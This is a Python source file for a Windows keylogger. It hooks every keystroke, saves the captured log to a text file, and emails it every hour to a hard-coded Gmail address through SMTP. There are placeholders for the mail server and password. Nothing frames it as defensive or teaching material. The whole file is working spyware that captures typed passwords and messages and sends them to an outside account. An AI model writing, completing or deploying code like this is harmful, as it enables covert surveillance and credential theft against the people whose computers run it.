import keyboard
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import schedule
import time

class Keylogger:
    def __init__(self, email):
        self.log = ""
        self.email = email

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
        self.log += name

    def send_email(self):
        subject = "Keylogger Report"
        body = self.log

        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        with open("keylogger.txt", "w") as output_file:
            output_file.write(self.log)

        with open("keylogger.txt", "rb") as attachment:
            part = MIMEApplication(attachment.read(), Name="keylogger.txt")

        part['Content-Disposition'] = f'attachment; filename="keylogger.txt"'
        msg.attach(part)

        server = smtplib.SMTP('smtp.your_email_provider.com', 587)  # Update with your email provider details
        server.starttls()
        server.login(self.email, 'your_email_password')  # Update with your email password
        server.sendmail(self.email, self.email, msg.as_string())
        server.quit()

        self.log = ""  # Clear log after sending email

def run_keylogger():
    email = "imanpal.125@gmail.com"  # Update with your email address
    keylogger = Keylogger(email)

    if sys.platform == "win32":
        keyboard.hook(keylogger.callback)
        schedule.every().hour.do(keylogger.send_email)  # Schedule email sending every 1 hour

        try:
            while True:
                schedule.run_pending()
                time.sleep(1)
        finally:
            keylogger.send_email()  # Send email when script is closed
    else:
        print("Platform not supported.")

if __name__ == "__main__":
    run_keylogger()
